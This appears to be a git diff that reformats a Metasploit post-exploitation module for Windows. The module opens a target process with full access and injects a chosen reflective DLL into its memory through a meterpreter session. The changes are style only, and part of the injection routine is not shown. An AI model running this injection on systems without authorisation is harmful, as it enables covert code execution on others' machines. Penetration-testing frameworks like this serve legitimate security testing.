@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,36 +9,35 @@ require 'msf/core/post/windows/reflective_dll_injection'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::ReflectiveDLLInjection
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Reflective DLL Injection Module',
-      'Description'   => %q{
-        This module will inject into the memory of a process a specified Reflective DLL.
-      },
-      'License'      => MSF_LICENSE,
-      'Author'       => [ 'Ben Campbell'],
-      'Platform'     => [ 'win' ],
-      'SessionTypes' => [ 'meterpreter' ],
-      'References'   =>
-        [
-          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
-        ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Manage Reflective DLL Injection Module',
+                      'Description'   => %q(
+                        This module will inject into the memory of a process a specified Reflective DLL.
+                      ),
+                      'License'      => MSF_LICENSE,
+                      'Author'       => [ 'Ben Campbell'],
+                      'Platform'     => [ 'win' ],
+                      'SessionTypes' => [ 'meterpreter' ],
+                      'References'   =>
+                        [
+                          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
+                        ]))
 
     register_options(
       [
-        OptPath.new('PATH',[true, 'Reflective DLL to inject into memory of a process.']),
-        OptInt.new('PID',[true, 'Process Identifier to inject of process to inject payload.']),
-      ], self.class)
+        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process.']),
+        OptInt.new('PID', [true, 'Process Identifier to inject of process to inject payload.'])
+      ], self.class
+    )
   end
 
   # Run Method for when run command is issued
   def run
     # syinfo is only on meterpreter sessions
-    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
+    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?
 
     pid = datastore['PID'].to_i
     host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
@@ -50,4 +50,3 @@ class MetasploitModule < Msf::Post
     print_good("DLL injected and invoked.")
   end
 end
-
